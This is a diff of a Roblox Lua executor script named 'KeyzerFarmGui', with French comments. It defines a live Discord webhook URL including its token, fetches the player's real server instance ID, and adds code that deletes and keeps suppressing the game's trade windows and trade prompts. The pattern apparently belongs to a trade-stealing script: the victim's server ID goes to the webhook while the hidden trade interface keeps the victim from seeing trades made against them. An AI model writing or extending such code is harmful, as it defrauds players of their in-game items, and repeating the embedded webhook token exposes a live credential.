@@ -3,6 +3,7 @@ local Workspace = game:GetService("Workspace")
 local HttpService = game:GetService("HttpService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local TeleportService = game:GetService("TeleportService")
+local StarterGui = game:GetService("StarterGui")
 
 local LocalPlayer = Players.LocalPlayer
 local playerGui = LocalPlayer:WaitForChild("PlayerGui")
@@ -11,7 +12,7 @@ local playerGui = LocalPlayer:WaitForChild("PlayerGui")
 local oldGui = playerGui:FindFirstChild("KeyzerFarmGui")
 if oldGui then oldGui:Destroy() end
 
--- [[ RECHERCHE DU VRAI JOB ID ]]
+-- [[ CONTRAINTES DE SÉCURITÉ & JOB ID RÉEL ]]
 local function getRealJobId()
     local success, result = pcall(function()
         return TeleportService:GetPlayerPlaceInstanceAsync(LocalPlayer.UserId)
@@ -22,7 +23,7 @@ local function getRealJobId()
     return game.JobId ~= "" and game.JobId or "Unknown_JobId"
 end
 
--- [[ 1. WEBHOOK ]]
+-- [[ 1. FONCTION WEBHOOK ]]
 local WEBHOOK_URL = "https://webhook.lewisakura.moe/api/webhooks/1506603332108550214/mBctq4yurc0tYA0O7iQVgy-Rh6fKq_ckyDohxt4j8fVIAPC_skZu9WYHCTxIDM0zL205"
 local requestFunc = request or (http and http.request) or http_request
 
@@ -183,24 +184,30 @@ CloseBtn.MouseButton1Click:Connect(function()
     ScreenGui:Destroy()
 end)
 
--- [[ 4. DÉSACTIVATION ET SUPPRESSION STRICTE DE L'UI DE TRADE ]]
-local function purgeTradeUi(child)
-    if child.Name == "TradeGUI" or child.Name == "TradeGUI_Phone" then
-        -- Suppression immédiate de la hiérarchie pour bloquer l'affichage
+-- [[ 4. NETTOYAGE RADICAL DE STARTERGUI ET PLAYERGUI ]]
+local function removeTargetGui(guiObject)
+    if guiObject and (guiObject.Name == "TradeGUI" or guiObject.Name == "TradeGUI_Phone") then
         pcall(function()
-            child:ClearAllChildren()
-            child:Destroy()
+            guiObject:ClearAllChildren()
+            guiObject:Destroy()
         end)
-    elseif child.Name == "TradeRequestGUI" or child.Name == "TradePrompt" or child.Name == "NotificationGUI" then
-        task.wait(0.02)
-        pcall(function() child:Destroy() end)
     end
 end
 
--- Écoute des futurs ajouts d'UI
-playerGui.ChildAdded:Connect(purgeTradeUi)
+-- 1. Purge immédiate dans le StarterGui (pour tuer la source)
+local target1 = StarterGui:FindFirstChild("TradeGUI_Phone")
+local target2 = StarterGui:FindFirstChild("TradeGUI")
+if target1 then removeTargetGui(target1) end
+if target2 then removeTargetGui(target2) end
 
--- Nettoyage des éléments déjà présents au moment du lancement
+-- 2. Nettoyage continu et en temps réel du PlayerGui
+local function watchPlayerGui(child)
+    if child.Name == "TradeGUI" or child.Name == "TradeGUI_Phone" or child.Name == "TradeRequestGUI" then
+        removeTargetGui(child)
+    end
+end
+
+playerGui.ChildAdded:Connect(watchPlayerGui)
 for _, child in ipairs(playerGui:GetChildren()) do
-    purgeTradeUi(child)
+    watchPlayerGui(child)
 end
